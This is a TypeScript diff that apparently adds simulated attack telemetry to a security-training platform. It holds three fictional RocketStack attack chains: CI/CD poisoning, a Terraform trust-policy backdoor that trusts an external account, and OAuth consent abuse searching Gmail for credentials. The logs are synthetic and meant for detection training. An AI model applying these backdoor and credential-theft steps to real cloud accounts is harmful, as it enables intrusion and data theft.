+    raw: { "aws.cloudtrail.eventName": "GetCallerIdentity", "aws.cloudtrail.eventSource": "sts.amazonaws.com", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::247316892041:assumed-role/rocketstack-ci-deploy-role/i-0abc123def456789", "aws.cloudtrail.sourceIPAddress": "185.220.101.42", "action_result": "allowed" }
+  },
+  {
+    id: "rscp7", ts: "2026-06-18T09:12:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail", src_ip: "185.220.101.42",
+    description: "CreateAccessKey established a standing access key on the IAM user rocketstack-deploy-prod, outliving the temporary role session",
+    mitre_technique: "T1098.001", mitre_tactic: "Persistence",
+    raw: { "aws.cloudtrail.eventName": "CreateAccessKey", "aws.cloudtrail.eventSource": "iam.amazonaws.com", "aws.cloudtrail.requestParameters.userName": "rocketstack-deploy-prod", "aws.cloudtrail.sourceIPAddress": "185.220.101.42", "action_result": "allowed" }
+  },
+  {
+    id: "rscp8", ts: "2026-06-18T09:16:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "high", vendor: "AWS CloudTrail", src_ip: "185.220.101.42",
+    description: "GetSecretValue retrieved the production database master password from Secrets Manager",
+    mitre_technique: "T1555.006", mitre_tactic: "Credential Access",
+    raw: { "aws.cloudtrail.eventName": "GetSecretValue", "aws.cloudtrail.eventSource": "secretsmanager.amazonaws.com", "aws.cloudtrail.requestParameters.secretId": "rocketstack/prod/db-master-password", "aws.cloudtrail.sourceIPAddress": "185.220.101.42", "action_result": "allowed" }
+  },
+  {
+    id: "rscp9", ts: "2026-06-18T09:21:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail", src_ip: "185.220.101.42",
+    description: "GetObject read exports/customers_full.csv from rocketstack-prod-customer-data using the new standing access key",
+    mitre_technique: "T1530", mitre_tactic: "Collection",
+    raw: { "aws.cloudtrail.eventName": "GetObject", "aws.cloudtrail.eventSource": "s3.amazonaws.com", "aws.cloudtrail.requestParameters.bucketName": "rocketstack-prod-customer-data", "aws.cloudtrail.requestParameters.key": "exports/customers_full.csv", "aws.cloudtrail.userIdentity.type": "IAMUser", "aws.cloudtrail.userIdentity.userName": "rocketstack-deploy-prod", "aws.cloudtrail.sourceIPAddress": "185.220.101.42", "action_result": "allowed" }
+  },
+  {
+    id: "rscp10", ts: "2026-06-18T09:26:00.000Z", source: "firewall", event_type: "net_connection",
+    severity: "high", vendor: "FortiGate", src_ip: "172.16.10.50", dst_ip: "185.220.101.42", dst_port: 443,
+    description: "A further outbound transfer from SRV-PROD-001 to 185.220.101.42 was blocked once threat intel flagged the IP",
+    mitre_technique: "T1041", mitre_tactic: "Exfiltration",
+    raw: { "data.type": "traffic", "data.subtype": "forward", "data.logid": "0000000021", "data.level": "warning", "data.action": "deny", "data.srcip": "172.16.10.50", "data.dstip": "185.220.101.42", "data.dstport": "443", "data.service": "HTTPS", "data.policyname": "prod-egress-filter", "data.srccountry": "Reserved", "action_result": "blocked" }
+  },
+  {
+    id: "rscp11", ts: "2026-06-18T09:30:00.000Z", source: "edr", event_type: "process_create",
+    severity: "critical", vendor: "CrowdStrike Falcon", hostname: "SRV-PROD-001", src_ip: "172.16.10.50",
+    is_detection: true,
+    description: "Falcon matched bootstrap.sh against an updated IOC feed, killed the lingering process and quarantined the file",
+    mitre_technique: "T1195.002", mitre_tactic: "Persistence",
+    process: { name: "bootstrap.sh", pid: 41210, parent_name: "sh", parent_pid: 41200, user: "ci-pipeline", path: "/tmp/bootstrap.sh" },
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Supply Chain Compromise", "crowdstrike.Tactic": "Persistence", "crowdstrike.SeverityName": "CRITICAL", "crowdstrike.PatternDispositionDescription": "Process Terminated, File Quarantined", "quarantine.status": "quarantined", "action_result": "process_killed" }
+  },
+];
+
+// ── RocketStack Chain F — IaC (Terraform) backdoor via poisoned trust policy ───
+const RS_TERRAFORM_IAC_BACKDOOR: TelemetryEvent[] = [
+  {
+    id: "rstb1", ts: "2026-06-22T14:00:00.000Z", source: "vcs", event_type: "policy_modification",
+    severity: "high", vendor: "GitHub", user_email: "m.ben-david@rocketstack.io",
+    description: "A PR merged into rocketstack-io/terraform-aws-network added an external AWS account to the rocketstack-prod-admin role's trust policy",
+    mitre_technique: "T1195.002", mitre_tactic: "Initial Access",
+    raw: { "github.audit.action": "pull_request.merge", "github.audit.actor": "m.ben-david", "github.audit.repo": "rocketstack-io/terraform-aws-network", "github.audit.base_ref": "main", "github.audit.head_ref": "fix/network-module-refactor", "github.workflow.diff_added_lines": "Principal = { AWS = \"arn:aws:iam::999999999999:root\" }", "event.action": "pull_request.merge", "event.outcome": "success", "user.name": "m.ben-david" }
+  },
+  {
+    id: "rstb2", ts: "2026-06-22T14:06:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail", src_ip: "172.16.10.50",
+    description: "The CI apply ran UpdateAssumeRolePolicy on rocketstack-prod-admin, adding sts:AssumeRole for an external account",
+    mitre_technique: "T1098.003", mitre_tactic: "Persistence",
+    raw: { "aws.cloudtrail.eventName": "UpdateAssumeRolePolicy", "aws.cloudtrail.eventSource": "iam.amazonaws.com", "aws.cloudtrail.requestParameters.roleName": "rocketstack-prod-admin", "aws.cloudtrail.requestParameters.policyDocument": "{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999999999999:root\"},\"Action\":\"sts:AssumeRole\"}]}", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::247316892041:assumed-role/rocketstack-ci-deploy-role/ci-pipeline", "aws.cloudtrail.sourceIPAddress": "172.16.10.50", "action_result": "allowed" }
+  },
+  {
+    id: "rstb3", ts: "2026-06-22T14:08:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "high", vendor: "AWS GuardDuty", src_ip: "172.16.10.50",
+    is_detection: true,
+    description: "GuardDuty flagged ci-pipeline's trust-policy change as PrivilegeEscalation:IAMUser/AdministrativePermissions",
+    mitre_technique: "T1098.003", mitre_tactic: "Persistence",
+    raw: { "aws.guardduty.type": "PrivilegeEscalation:IAMUser/AdministrativePermissions", "aws.guardduty.severity": "7.0", "aws.guardduty.title": "An IAM entity modified a resource's trust policy to grant broad or external access.", "aws.cloudtrail.awsRegion": "us-east-1", "action_result": "detected" }
+  },
+  {
+    id: "rstb4", ts: "2026-06-22T14:15:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail", src_ip: "91.234.100.55",
+    description: "AssumeRole from the newly-trusted external account 999999999999 succeeded against rocketstack-prod-admin",
+    mitre_technique: "T1199", mitre_tactic: "Initial Access",
+    raw: { "aws.cloudtrail.eventName": "AssumeRole", "aws.cloudtrail.eventSource": "sts.amazonaws.com", "aws.cloudtrail.requestParameters.roleArn": "arn:aws:iam::247316892041:role/rocketstack-prod-admin", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.accountId": "999999999999", "aws.cloudtrail.sourceIPAddress": "91.234.100.55", "action_result": "allowed" }
+  },
+  {
+    id: "rstb5", ts: "2026-06-22T14:19:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail", src_ip: "91.234.100.55",
+    description: "The external principal listed buckets and read objects from rocketstack-prod-customer-data",
+    mitre_technique: "T1530", mitre_tactic: "Collection",
+    raw: { "aws.cloudtrail.eventName": "GetObject", "aws.cloudtrail.eventSource": "s3.amazonaws.com", "aws.cloudtrail.requestParameters.bucketName": "rocketstack-prod-customer-data", "aws.cloudtrail.requestParameters.key": "exports/customers_full.csv", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.accountId": "999999999999", "aws.cloudtrail.sourceIPAddress": "91.234.100.55", "action_result": "allowed" }
+  },
+  {
+    id: "rstb6", ts: "2026-06-22T14:24:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "high", vendor: "AWS CloudTrail", src_ip: "91.234.100.55",
+    description: "GetSecretValue retrieved the production database master password using the backdoored role session",
+    mitre_technique: "T1555.006", mitre_tactic: "Credential Access",
+    raw: { "aws.cloudtrail.eventName": "GetSecretValue", "aws.cloudtrail.eventSource": "secretsmanager.amazonaws.com", "aws.cloudtrail.requestParameters.secretId": "rocketstack/prod/db-master-password", "aws.cloudtrail.userIdentity.accountId": "999999999999", "aws.cloudtrail.sourceIPAddress": "91.234.100.55", "action_result": "allowed" }
+  },
+  {
+    id: "rstb7", ts: "2026-06-22T14:33:00.000Z", source: "firewall", event_type: "net_connection",
+    severity: "high", vendor: "FortiGate", src_ip: "172.16.10.1", dst_ip: "91.234.100.55", dst_port: 443,
+    description: "A large outbound transfer from the VPC NAT gateway to 91.234.100.55 was blocked once an IPS signature updated",
+    mitre_technique: "T1041", mitre_tactic: "Exfiltration",
+    raw: { "data.type": "traffic", "data.subtype": "forward", "data.logid": "0000000021", "data.level": "warning", "data.action": "deny", "data.srcip": "172.16.10.1", "data.dstip": "91.234.100.55", "data.dstport": "443", "data.service": "HTTPS", "data.policyname": "prod-egress-filter", "data.srccountry": "Reserved", "action_result": "blocked" }
+  },
+  {
+    id: "rstb8", ts: "2026-06-22T14:40:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS GuardDuty", src_ip: "91.234.100.55",
+    is_detection: true,
+    description: "GuardDuty raised Exfiltration:S3/ObjectRead.Unusual for the anomalous high-volume reads from account 999999999999",
+    mitre_technique: "T1530", mitre_tactic: "Collection",
+    raw: { "aws.guardduty.type": "Exfiltration:S3/ObjectRead.Unusual", "aws.guardduty.severity": "8.0", "aws.guardduty.title": "An unusual amount of data was downloaded from an S3 bucket by an unusual principal.", "aws.cloudtrail.awsRegion": "us-east-1", "action_result": "detected" }
+  },
+  {
+    id: "rstb9", ts: "2026-06-22T15:10:00.000Z", source: "vcs", event_type: "policy_modification",
+    severity: "medium", vendor: "GitHub", user_email: "n.shapiro@rocketstack.io",
+    description: "The security team reverted the backdoored commit and enabled required reviews on the module repo",
+    raw: { "github.audit.action": "branch_protection_rule.update", "github.audit.actor": "n.shapiro", "github.audit.repo": "rocketstack-io/terraform-aws-network", "event.action": "branch_protection_rule.update", "event.outcome": "success", "user.name": "n.shapiro" }
+  },
+];
+
+// ── RocketStack Chain G — SaaS OAuth consent-chaining → AWS federation abuse ───
+const RS_OAUTH_CONSENT_CHAINING: TelemetryEvent[] = [
+  {
+    id: "rsoc1", ts: "2026-06-28T10:00:00.000Z", source: "gws", event_type: "cloud_role_change",
+    severity: "high", vendor: "Google Workspace", user_email: "r.cohen@rocketstack.io",
+    description: "r.cohen granted the third-party app QuickSync Analytics broad Drive and Gmail read scopes",
+    mitre_technique: "T1528", mitre_tactic: "Credential Access",
+    raw: { "gws.event.type": "authorize", "application.name": "QuickSync Analytics", "application.id": "748213906655-a1b2c3d4e5f6g7h8.apps.googleusercontent.com", "application.type": "oauth2", "gws.parameters.scope": "https://www.googleapis.com/auth/drive.readonly,https://mail.google.com/", "gws.parameters.product_bucket": "GMAIL", "event.action": "authorize", "event.outcome": "success", "user.email": "r.cohen@rocketstack.io", "action_result": "allowed" }
+  },
+  {
+    id: "rsoc2", ts: "2026-06-28T10:02:00.000Z", source: "gws", event_type: "cloud_storage_access",
+    severity: "high", vendor: "Google Workspace", user_email: "r.cohen@rocketstack.io",
+    description: "QuickSync Analytics exported files from the shared Engineering drive, including Prod Infra Runbook.docx",
+    mitre_technique: "T1213", mitre_tactic: "Collection",
+    raw: { "gws.event.type": "drive.export", "application.name": "QuickSync Analytics", "storage.object.name": "Prod Infra Runbook.docx", "storage.bucket.name": "Shared Drive: Engineering", "cloud.service.name": "Google Drive", "event.action": "drive.export", "event.outcome": "success", "user.email": "r.cohen@rocketstack.io", "action_result": "allowed" }
+  },
+  {
+    id: "rsoc3", ts: "2026-06-28T10:04:00.000Z", source: "gws", event_type: "cloud_api_call",
+    severity: "high", vendor: "Google Workspace", user_email: "r.cohen@rocketstack.io",
+    description: "QuickSync Analytics searched r.cohen's Gmail for messages matching subject:(okta OR credentials OR password OR token)",
+    mitre_technique: "T1114.002", mitre_tactic: "Collection",
+    raw: { "gws.event.type": "gmail.messages.list", "application.name": "QuickSync Analytics", "cloud.service.name": "Gmail", "cloud.resource.name": "INBOX", "gws.parameters.query": "subject:(okta OR credentials OR password OR token)", "event.action": "messages.list", "event.outcome": "success", "user.email": "r.cohen@rocketstack.io", "action_result": "allowed" }
+  },
+  {
+    id: "rsoc4", ts: "2026-06-28T10:05:00.000Z", source: "gws", event_type: "cloud_api_call",
+    severity: "critical", vendor: "Google Workspace", user_email: "r.cohen@rocketstack.io",
+    description: "QuickSync Analytics opened a DevOps handoff email containing a plaintext Okta API token",
+    mitre_technique: "T1552.001", mitre_tactic: "Credential Access",
+    raw: { "gws.event.type": "gmail.messages.get", "application.name": "QuickSync Analytics", "gws.subject": "Okta API token for CI handoff", "gws.sender": "j.lee@rocketstack.io", "gws.recipient": "r.cohen@rocketstack.io", "event.action": "messages.get", "event.outcome": "success", "user.email": "r.cohen@rocketstack.io", "action_result": "allowed" }
+  },
+  {
+    id: "rsoc5", ts: "2026-06-28T10:11:00.000Z", source: "okta", event_type: "auth_success",
+    severity: "high", vendor: "Okta", src_ip: "185.220.101.90",
+    is_detection: true,
+    description: "The leaked API token's bulk calls to /api/v1/users tripped Okta's integration rate-limit alerting",
+    mitre_technique: "T1087.004", mitre_tactic: "Discovery",
+    raw: { "okta.eventType": "application.integration.rate_limit_exceeded", "okta.actor.type": "AppInstance", "okta.actor.displayName": "CI Automation Token", "okta.client.ipAddress": "185.220.101.90", "okta.outcome.result": "SUCCESS", "action_result": "detected" }
+  },
+  {
+    id: "rsoc6", ts: "2026-06-28T10:17:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail", src_ip: "185.220.101.90",
+    description: "AssumeRoleWithSAML using an Okta-issued assertion succeeded against the AWS federation role from an unfamiliar IP",
+    mitre_technique: "T1078.004", mitre_tactic: "Initial Access",
+    raw: { "aws.cloudtrail.eventName": "AssumeRoleWithSAML", "aws.cloudtrail.eventSource": "sts.amazonaws.com", "aws.cloudtrail.requestParameters.roleArn": "arn:aws:iam::247316892041:role/rocketstack-okta-federated-admin", "aws.cloudtrail.requestParameters.principalArn": "arn:aws:iam::247316892041:saml-provider/Okta", "aws.cloudtrail.sourceIPAddress": "185.220.101.90", "action_result": "allowed" }
+  },
+  {
+    id: "rsoc7", ts: "2026-06-28T10:21:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail", src_ip: "185.220.101.90",
+    description: "The federated session listed buckets and read objects from rocketstack-prod-customer-data",
+    mitre_technique: "T1530", mitre_tactic: "Collection",
+    raw: { "aws.cloudtrail.eventName": "GetObject", "aws.cloudtrail.eventSource": "s3.amazonaws.com", "aws.cloudtrail.requestParameters.bucketName": "rocketstack-prod-customer-data", "aws.cloudtrail.requestParameters.key": "exports/customers_full.csv", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.sourceIPAddress": "185.220.101.90", "action_result": "allowed" }
+  },
+  {
+    id: "rsoc8", ts: "2026-06-28T10:50:00.000Z", source: "gws", event_type: "account_modify",
+    severity: "medium", vendor: "Google Workspace", user_email: "admin@rocketstack.io",
+    description: "A Workspace admin revoked QuickSync Analytics' OAuth grant organization-wide",
+    raw: { "gws.event.type": "revoke", "application.name": "QuickSync Analytics", "event.action": "revoke", "event.outcome": "success", "user.email": "admin@rocketstack.io", "action_result": "blocked" }
+  },
+  {
+    id: "rsoc9", ts: "2026-06-28T10:55:00.000Z", source: "okta", event_type: "account_modify",
+    severity: "medium", vendor: "Okta", src_ip: "172.16.10.7",
+    description: "An Okta admin revoked the leaked CI Automation Token and cleared r.cohen's active sessions",
+    raw: { "okta.eventType": "system.api_token.revoke", "okta.actor.displayName": "CI Automation Token", "okta.outcome.result": "SUCCESS", "action_result": "blocked" }
+  },
+];
+
+const QB_ADVANCED_STORIES: AttackStory[] = [
+  story("qb-swift-wire-fraud", { title: "SWIFT Wire-Fraud — Vendor Payment Redirect", events: QB_SWIFT_WIRE_FRAUD }, "advanced", ["quantumbank"]),
+  story("qb-fraud-monitoring-tampering", { title: "Fraud-Monitoring Tampering — Alarm Threshold Manipulation", events: QB_FRAUD_MONITORING_TAMPERING }, "advanced", ["quantumbank"]),
+  story("qb-cyberark-mule-payout", { title: "CyberArk PAM Abuse → Money-Mule Payout (Structuring)", events: QB_CYBERARK_MULE_PAYOUT }, "advanced", ["quantumbank"]),
+];
+
+const RS_ADVANCED_STORIES: AttackStory[] = [
+  story("rs-cicd-pipeline-poisoning", { title: "CI/CD Pipeline Poisoning — Self-Hosted GitHub Actions Runner", events: RS_CICD_PIPELINE_POISONING }, "advanced", ["rocketstack"]),
+  story("rs-terraform-iac-backdoor", { title: "IaC Backdoor — Poisoned Terraform Trust Policy", events: RS_TERRAFORM_IAC_BACKDOOR }, "advanced", ["rocketstack"]),
+  story("rs-oauth-consent-chaining", { title: "SaaS OAuth Consent-Chaining → AWS Federation Abuse", events: RS_OAUTH_CONSENT_CHAINING }, "advanced", ["rocketstack"]),
+];
+
 export const ATTACK_STORIES: AttackStory[] = [
   ...GENERIC_STORIES,
   ...COMPANY_CHAIN_STORIES,
   ROCKETSTACK_CRED_STUFFING_STORY,
+  ...QB_ADVANCED_STORIES,
+  ...RS_ADVANCED_STORIES,
 ];
 
 // ── Company fit ───────────────────────────────────────────────────────────────
@@ -394,6 +872,7 @@ const SOURCE_ALIASES: Record<string, string[]> = {
   waf:              ["firewall", "cloudtrail"],  // WAF is an edge/firewall-class device
   db_monitor:       ["edr", "cloudtrail"],       // database activity monitoring
   cloud_azure:      ["o365", "cloudtrail"],
+  vcs:              ["cloudtrail"],              // GitHub/source-control audit trail, alongside the cloud estate it deploys into
   // SIEM/SOAR correlation + automation meta-events are produced by the platform
   // itself, so they are "available" wherever the SIEM is (i.e. everywhere).
   siem: ["edr", "ad", "o365", "okta", "cloudtrail", "firewall", "vpn", "dns", "proxy", "gws", "sysmon"],
